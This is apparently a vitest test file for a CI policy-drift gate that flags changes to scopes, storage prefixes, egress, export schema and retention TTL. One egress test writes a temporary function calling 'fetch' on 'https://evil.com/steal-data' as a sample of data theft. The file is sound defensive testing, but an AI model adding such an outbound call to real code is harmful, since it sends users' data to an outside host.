/**
 * P1.5: Policy Drift Protection - Negative Validation Tests
 *
 * These tests verify that the policy drift gate BLOCKS unauthorized changes.
 * They simulate policy changes and verify the drift detection fails as expected.
 *
 * Run with: npm test -- p1_policy_drift.test.ts
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import fs from 'fs';
import path from 'path';
import { execSync } from 'child_process';

const BASELINE_DIR = path.join(__dirname, '../audit/policy_baseline');
const DRIFT_CHECK = path.join(__dirname, '../audit/policy_drift_check.js');

/**
 * Utility: Read and backup baseline file
 */
function backupBaseline(filename: string): string {
  const filePath = path.join(BASELINE_DIR, filename);
  return fs.readFileSync(filePath, 'utf8');
}

/**
 * Utility: Restore baseline file
 */
function restoreBaseline(filename: string, content: string) {
  const filePath = path.join(BASELINE_DIR, filename);
  fs.writeFileSync(filePath, content, 'utf8');
}

/**
 * Utility: Run drift check and capture output
 */
function runDriftCheck(): { exitCode: number; output: string } {
  try {
    const output = execSync(`node ${DRIFT_CHECK}`, {
      cwd: path.dirname(DRIFT_CHECK),
      encoding: 'utf8',
    });
    return { exitCode: 0, output };
  } catch (err: any) {
    return { exitCode: err.status || 1, output: err.stdout || '' };
  }
}

/**
 * Utility: Parse JSON from file
 * Throws if file is not valid JSON
 */
function readJson(filePath: string): Record<string, any> {
  const content = fs.readFileSync(filePath, 'utf8');
  return JSON.parse(content);
}

/**
 * Utility: Write JSON to file with stable formatting
 * Uses 2-space indent and trailing newline for deterministic output
 */
function writeJson(filePath: string, obj: Record<string, any>): void {
  const content = JSON.stringify(obj, null, 2) + '\n';
  fs.writeFileSync(filePath, content, 'utf8');
}

/**
 * Utility: Assert a numeric value exists at nested path in object
 * Throws clear error if path is missing or value is not a number
 */
function assertNumberAtPath(obj: Record<string, any>, pathArray: string[], expected: number): void {
  let current = obj;
  for (const key of pathArray.slice(0, -1)) {
    if (!(key in current)) {
      throw new Error(`Baseline schema unexpected: missing path component '${key}'`);
    }
    current = current[key];
    if (typeof current !== 'object' || current === null) {
      throw new Error(`Baseline schema unexpected: '${key}' is not an object`);
    }
  }
  const finalKey = pathArray[pathArray.length - 1];
  if (!(finalKey in current)) {
    throw new Error(`Baseline schema unexpected: missing field '${finalKey}' at path ${pathArray.join('.')}`);
  }
  const value = current[finalKey];
  if (typeof value !== 'number') {
    throw new Error(`Baseline schema unexpected: field '${finalKey}' is not a number, got ${typeof value}`);
  }
  if (value !== expected) {
    throw new Error(`Assertion failed: expected ${finalKey} to be ${expected}, got ${value}`);
  }
}

/**
 * Utility: Set a numeric value at nested path in object
 * Throws clear error if path is incomplete or missing
 */
function setNumberAtPath(obj: Record<string, any>, pathArray: string[], value: number): void {
  let current = obj;
  for (const key of pathArray.slice(0, -1)) {
    if (!(key in current)) {
      throw new Error(`Baseline schema unexpected: cannot set value—missing path component '${key}'`);
    }
    current = current[key];
    if (typeof current !== 'object' || current === null) {
      throw new Error(`Baseline schema unexpected: cannot set value—'${key}' is not an object`);
    }
  }
  const finalKey = pathArray[pathArray.length - 1];
  if (!(finalKey in current)) {
    throw new Error(`Baseline schema unexpected: cannot set value—missing field '${finalKey}' at path ${pathArray.join('.')}`);
  }
  current[finalKey] = value;
}

describe('P1.5: Policy Drift Protection (Negative Validation)', () => {
  beforeEach(() => {
    // Verify baseline files exist before each test
    expect(fs.existsSync(BASELINE_DIR)).toBe(true);
    expect(fs.existsSync(path.join(BASELINE_DIR, 'scopes.json'))).toBe(true);
    expect(fs.existsSync(path.join(BASELINE_DIR, 'storage_keys.txt'))).toBe(true);
    expect(fs.existsSync(path.join(BASELINE_DIR, 'egress.txt'))).toBe(true);
    expect(fs.existsSync(path.join(BASELINE_DIR, 'export_schema.json'))).toBe(true);
    expect(fs.existsSync(path.join(BASELINE_DIR, 'retention_policy.json'))).toBe(true);
  });

  describe('Clean Repository Behavior', () => {
    it('should pass all checks on clean repository', () => {
      const { exitCode, output } = runDriftCheck();
      expect(exitCode).toBe(0);
      expect(output).toContain('All policy checks passed');
      expect(output).toContain('✓ Scopes');
      expect(output).toContain('✓ Storage Keys');
      expect(output).toContain('✓ Egress');
      expect(output).toContain('✓ Export Schema');
      expect(output).toContain('✓ Retention Policy');
    });
  });

  describe('Scope Drift Detection', () => {
    it('should detect when scopes are added to manifest', () => {
      const manifestPath = path.join(__dirname, '../manifest.yml');
      const original = fs.readFileSync(manifestPath, 'utf8');

      try {
        // Simulate adding scopes to manifest
        const modified = original + '\npermissions:\n  scopes:\n    - jira:read\n';
        fs.writeFileSync(manifestPath, modified, 'utf8');

        const { exitCode, output } = runDriftCheck();
        expect(exitCode).toBe(1);
        expect(output).toContain('DRIFT DETECTED');
        expect(output).toContain('scopes section found');
      } finally {
        fs.writeFileSync(manifestPath, original, 'utf8');
      }
    });

    it('should pass when scopes section is removed', () => {
      // Baseline is no scopes - so clean repo should pass
      const { exitCode } = runDriftCheck();
      expect(exitCode).toBe(0);
    });
  });

  describe('Storage Key Drift Detection', () => {
    it('should detect when new storage prefix is added to code', () => {
      const constantsPath = path.join(__dirname, '../src/phase6/constants.ts');
      const original = fs.readFileSync(constantsPath, 'utf8');

      try {
        // Simulate adding a new storage prefix
        const modified = original.replace(
          'snapshot_index: \'phase6:snapshot_index\',',
          'snapshot_index: \'phase6:snapshot_index\',\n  new_unauthorized_prefix: \'unauthorized:new_data\','
        );
        fs.writeFileSync(constantsPath, modified, 'utf8');

        const { exitCode, output } = runDriftCheck();
        expect(exitCode).toBe(1);
        expect(output).toContain('DRIFT DETECTED');
        expect(output).toContain('NEW PREFIX DETECTED');
      } finally {
        fs.writeFileSync(constantsPath, original, 'utf8');
      }
    });

    it('should detect when baseline is manually edited to allow new prefix', () => {
      const original = backupBaseline('storage_keys.txt');

      try {
        // Simulate manually adding a new prefix to storage_keys (attacker scenario)
        const modified = original + '\nunauthorized:This was added by attacker\n';
        restoreBaseline('storage_keys.txt', modified);

        // The code doesn't have this prefix, so drift check would fail
        // because baseline has prefix that code doesn't
        const { exitCode, output } = runDriftCheck();
        expect(exitCode).toBe(1);
        expect(output).toContain('REMOVED PREFIX');
      } finally {
        restoreBaseline('storage_keys.txt', original);
      }
    });
  });

  describe('Egress Drift Detection', () => {
    it('should detect when fetch() is added to non-admin code', () => {
      // Create a test file with unauthorized fetch
      const testFile = path.join(__dirname, '../src/phase6/unauthorized_fetch.ts');

      try {
        fs.writeFileSync(
          testFile,
          `
export async function evilFunction() {
  const response = await fetch('https://evil.com/steal-data');
  return response.json();
}
`,
          'utf8'
        );

        const { exitCode, output } = runDriftCheck();
        expect(exitCode).toBe(1);
        expect(output).toContain('UNAUTHORIZED EGRESS');
        expect(output).toContain('fetch');
      } finally {
        if (fs.existsSync(testFile)) {
          fs.unlinkSync(testFile);
        }
      }
    });

    it('should allow fetch() in admin UI code', () => {
      // Admin UI is allowed to use browser fetch for client-side requests
      // This test verifies the exception
      const { exitCode, output } = runDriftCheck();
      expect(exitCode).toBe(0);
      // Admin code with fetch should be fine
      expect(output).toContain('No unauthorized outbound calls');
    });
  });

  describe('Export Schema Drift Detection', () => {
    it('should detect when export schema version changes', () => {
      const truthPath = path.join(__dirname, '../src/phase9/export_truth.ts');
      const original = fs.readFileSync(truthPath, 'utf8');

      try {
        // Simulate changing schema version
        const modified = original.replace(
          "export const EXPORT_SCHEMA_VERSION = '1.0'",
          "export const EXPORT_SCHEMA_VERSION = '2.0'"
        );
        fs.writeFileSync(truthPath, modified, 'utf8');

        const { exitCode, output } = runDriftCheck();
        expect(exitCode).toBe(1);
        expect(output).toContain('SCHEMA DRIFT');
        expect(output).toContain('Version changed');
      } finally {
        fs.writeFileSync(truthPath, original, 'utf8');
      }
    });

    it('should pass when schema version matches baseline', () => {
      const { exitCode, output } = runDriftCheck();
      expect(exitCode).toBe(0);
      expect(output).toContain('Export schema version matches');
    });
  });

  describe('Retention Policy Drift Detection', () => {
    it('should detect when TTL is changed below 90 days', () => {
      const constantsPath = path.join(__dirname, '../src/phase6/constants.ts');
      const original = fs.readFileSync(constantsPath, 'utf8');

      try {
        // Simulate changing TTL to 30 days (attacker trying to keep data longer)
        const modified = original.replace(
          'max_days: 90,',
          'max_days: 30,'
        );
        fs.writeFileSync(constantsPath, modified, 'utf8');

        const { exitCode, output } = runDriftCheck();
        expect(exitCode).toBe(1);
        expect(output).toContain('TTL DRIFT');
      } finally {
        fs.writeFileSync(constantsPath, original, 'utf8');
      }
    });

    it('should detect when TTL is changed above 90 days', () => {
      const constantsPath = path.join(__dirname, '../src/phase6/constants.ts');
      const original = fs.readFileSync(constantsPath, 'utf8');

      try {
        // Simulate changing TTL to 180 days (attacker trying to keep more data)
        const modified = original.replace(
          'max_days: 90,',
          'max_days: 180,'
        );
        fs.writeFileSync(constantsPath, modified, 'utf8');

        const { exitCode, output } = runDriftCheck();
        expect(exitCode).toBe(1);
        expect(output).toContain('TTL DRIFT');
      } finally {
        fs.writeFileSync(constantsPath, original, 'utf8');
      }
    });

    it('should pass when TTL matches baseline (90 days)', () => {
      const { exitCode, output } = runDriftCheck();
      expect(exitCode).toBe(0);
      expect(output).toContain('Retention policy matches');
    });
  });

  describe('Multiple Simultaneous Drifts', () => {
    it('should detect all drifts when multiple baselines are violated', () => {
      const truthPath = path.join(__dirname, '../src/phase9/export_truth.ts');
      const constantsPath = path.join(__dirname, '../src/phase6/constants.ts');
      const originalTruth = fs.readFileSync(truthPath, 'utf8');
      const originalConstants = fs.readFileSync(constantsPath, 'utf8');

      try {
        // Simultaneously change schema version and TTL
        const modifiedTruth = originalTruth.replace(
          "export const EXPORT_SCHEMA_VERSION = '1.0'",
          "export const EXPORT_SCHEMA_VERSION = '2.0'"
        );
        const modifiedConstants = originalConstants.replace(
          'max_days: 90,',
          'max_days: 180,'
        );

        fs.writeFileSync(truthPath, modifiedTruth, 'utf8');
        fs.writeFileSync(constantsPath, modifiedConstants, 'utf8');

        const { exitCode, output } = runDriftCheck();
        expect(exitCode).toBe(1);
        expect(output).toContain('SCHEMA DRIFT');
        expect(output).toContain('TTL DRIFT');
        expect(output).toContain('Result: 3/5 checks passed'); // Only 3 of 5 pass
      } finally {
        fs.writeFileSync(truthPath, originalTruth, 'utf8');
        fs.writeFileSync(constantsPath, originalConstants, 'utf8');
      }
    });
  });

  describe('Baseline File Validation', () => {
    it('should have valid baseline JSON files', () => {
      const jsonFiles = ['scopes.json', 'export_schema.json', 'retention_policy.json'];

      for (const file of jsonFiles) {
        const content = fs.readFileSync(path.join(BASELINE_DIR, file), 'utf8');
        expect(() => JSON.parse(content)).not.toThrow();
      }
    });

    it('should have baseline text files with proper format', () => {
      const storageKeysPath = path.join(BASELINE_DIR, 'storage_keys.txt');
      const content = fs.readFileSync(storageKeysPath, 'utf8');

      // Should have at least phase6: prefix
      expect(content).toContain('phase6:');
      
      // Each non-comment, non-empty line should have a prefix
      const lines = content.split('\n');
      for (const line of lines) {
        if (line.trim() && !line.trim().startsWith('#')) {
          // Valid lines have format: prefix:description
          expect(line).toMatch(/^\w+:[^:]/);
        }
      }
    });

    it('should have egress baseline file', () => {
      const egressPath = path.join(BASELINE_DIR, 'egress.txt');
      const content = fs.readFileSync(egressPath, 'utf8');

      // Baseline should indicate NONE
      expect(content.toUpperCase()).toContain('NONE');
    });
  });

  describe('Drift Check Behavior on Missing Files', () => {
    it('should handle missing baseline files gracefully', () => {
      const storageKeysPath = path.join(BASELINE_DIR, 'storage_keys.txt');
      const original = fs.readFileSync(storageKeysPath, 'utf8');

      try {
        fs.unlinkSync(storageKeysPath);

        const { exitCode, output } = runDriftCheck();
        expect(exitCode).toBe(1);
        expect(output).toContain('Error');
      } finally {
        fs.writeFileSync(storageKeysPath, original, 'utf8');
      }
    });
  });

  describe('Approving Legitimate Policy Changes', () => {
    it('should pass after baseline is updated with new value', () => {
      // Test scenario: Developer intentionally changes TTL from 90 to 91 days
      // This validates the complete approval workflow:
      // 1. Code change detected as drift
      // 2. Baseline updated using structured JSON editing
      // 3. Drift check passes with updated baseline
      // 4. Baseline is always restored to original state
      
      const constantsPath = path.join(__dirname, '../src/phase6/constants.ts');
      const baselineFilePath = path.join(BASELINE_DIR, 'retention_policy.json');
      
      // Read and preserve original files as literal text for deterministic restoration
      const originalConstantsText = fs.readFileSync(constantsPath, 'utf8');
      const originalBaselineText = fs.readFileSync(baselineFilePath, 'utf8');

      try {
        // STEP 1: Change TTL in code (90 → 91, small delta for determinism)
        const modifiedConstants = originalConstantsText.replace(
          'max_days: 90,',
          'max_days: 91,'
        );
        fs.writeFileSync(constantsPath, modifiedConstants, 'utf8');
        
        // Verify file was actually written to disk
        const verifyWrite = fs.readFileSync(constantsPath, 'utf8');
        expect(verifyWrite).toContain('max_days: 91,');
        expect(verifyWrite).not.toContain('max_days: 90,');

        // STEP 2: Drift check should FAIL (code changed to 91, baseline still 90)
        let result = runDriftCheck();
        expect(result.exitCode).toBe(1);
        expect(result.output).toContain('TTL DRIFT');
        expect(result.output).toContain('Result: 4/5 checks passed'); // 4 pass, retention fails

        // STEP 3: Update baseline to approve the new TTL using structured JSON editing
        // Read and parse the baseline JSON
        const baselineObj = readJson(baselineFilePath);
        const oldTtl = 90;
        const newTtl = 91;

        // Detect and update TTL fields based on schema shape
        // Shape A: nested ttl_days object
        if ('ttl_days' in baselineObj && typeof baselineObj.ttl_days === 'object' && baselineObj.ttl_days !== null) {
          const ttlDaysObj = baselineObj.ttl_days;
          // Update all numeric TTL fields under ttl_days
          for (const key of Object.keys(ttlDaysObj)) {
            if (typeof ttlDaysObj[key] === 'number' && ttlDaysObj[key] === oldTtl) {
              ttlDaysObj[key] = newTtl;
            }
          }
          // Verify all expected fields were updated
          assertNumberAtPath(baselineObj, ['ttl_days', 'raw_shard_ttl_days'], newTtl);
          assertNumberAtPath(baselineObj, ['ttl_days', 'daily_aggregate_ttl_days'], newTtl);
          assertNumberAtPath(baselineObj, ['ttl_days', 'weekly_aggregate_ttl_days'], newTtl);
        }
        // Shape B: legacy flat max_days field (fallback)
        else if ('max_days' in baselineObj && typeof baselineObj.max_days === 'number') {
          baselineObj.max_days = newTtl;
          assertNumberAtPath(baselineObj, ['max_days'], newTtl);
        }
        // Neither shape found: fail hard
        else {
          throw new Error('Baseline schema unexpected: neither ttl_days nor max_days found');
        }

        // Write the modified baseline using structured JSON format
        writeJson(baselineFilePath, baselineObj);

        // VERIFY POST-WRITE: Re-read and re-parse to confirm changes persisted
        const verifyBaselineObj = readJson(baselineFilePath);
        assertNumberAtPath(verifyBaselineObj, ['ttl_days', 'raw_shard_ttl_days'], newTtl);
        expect(verifyBaselineObj.ttl_days.daily_aggregate_ttl_days).toBe(newTtl);
        expect(verifyBaselineObj.ttl_days.weekly_aggregate_ttl_days).toBe(newTtl);

        // STEP 4: Drift check should now PASS (code and baseline both 91)
        result = runDriftCheck();
        expect(result.exitCode).toBe(0);
        expect(result.output).toContain('All policy checks passed');
        expect(result.output).toContain('Result: 5/5 checks passed');
      } finally {
        // RESTORATION: Always restore original files using literal text (non-negotiable)
        fs.writeFileSync(constantsPath, originalConstantsText, 'utf8');
        fs.writeFileSync(baselineFilePath, originalBaselineText, 'utf8');
        
        // VERIFY RESTORATION: Re-read files and assert they match originals exactly
        const restoredConstantsText = fs.readFileSync(constantsPath, 'utf8');
        const restoredBaselineText = fs.readFileSync(baselineFilePath, 'utf8');
        
        expect(restoredConstantsText).toBe(originalConstantsText);
        expect(restoredBaselineText).toBe(originalBaselineText);
        expect(restoredConstantsText).toContain('max_days: 90,');
        expect(restoredBaselineText).toContain('"raw_shard_ttl_days": 90');
      }
    });
  });

  describe('CI Integration Validation', () => {
    it('should have GitHub Actions workflow configured', () => {
      const workflowPath = path.join(__dirname, '../.github/workflows/policy-drift-gate.yml');
      expect(fs.existsSync(workflowPath)).toBe(true);

      const content = fs.readFileSync(workflowPath, 'utf8');
      expect(content).toContain('policy-drift-gate');
      expect(content).toContain('audit/policy_drift_check.js');
      // The workflow may have continue-on-error in some steps, but not for the main check
      expect(content).toContain('Run Policy Drift Detection');
    });

    it('should require documentation update when baseline changes', () => {
      const workflowPath = path.join(__dirname, '../.github/workflows/policy-drift-gate.yml');
      const content = fs.readFileSync(workflowPath, 'utf8');

      expect(content).toContain('baseline_modified');
      expect(content).toContain('SECURITY.md');
      expect(content).toContain('PRIVACY.md');
    });
  });
});
